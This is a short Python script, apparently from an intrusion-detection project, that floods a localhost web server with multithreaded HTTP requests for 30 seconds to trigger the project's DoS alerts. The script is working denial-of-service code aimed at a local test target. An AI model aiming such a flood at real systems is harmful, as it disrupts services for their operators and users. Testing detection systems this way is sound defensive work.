"""
IIDPS NEXUS - DoS Flood Attack Script
Run this from a separate terminal to test your IDS.
Usage: python attack_dos_flood.py
"""
import threading
import time
import urllib.request

TARGET = "http://127.0.0.1:8000/"
THREADS = 50
DURATION = 30  # seconds

request_count = [0]
lock = threading.Lock()
stop = False

def flood():
    global stop
    while not stop:
        try:
            urllib.request.urlopen(TARGET, timeout=1)
        except:
            pass
        with lock:
            request_count[0] += 1

if __name__ == "__main__":
    print(f"=" * 50)
    print(f"  IIDPS DoS Flood Test")
    print(f"  Target:   {TARGET}")
    print(f"  Threads:  {THREADS}")
    print(f"  Duration: {DURATION}s")
    print(f"=" * 50)
    print(f"\nStarting flood...")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)

    start = time.time()
    while time.time() - start < DURATION:
        time.sleep(1)
        elapsed = int(time.time() - start)
        print(f"  [{elapsed}/{DURATION}s] Requests sent: {request_count[0]}", end="\r")

    stop = True
    time.sleep(1)

    print(f"\n\nFlood complete!")
    print(f"Total requests sent: {request_count[0]}")
    print(f"\n>> Check your IIDPS dashboard for DDoS Attempt alerts!")
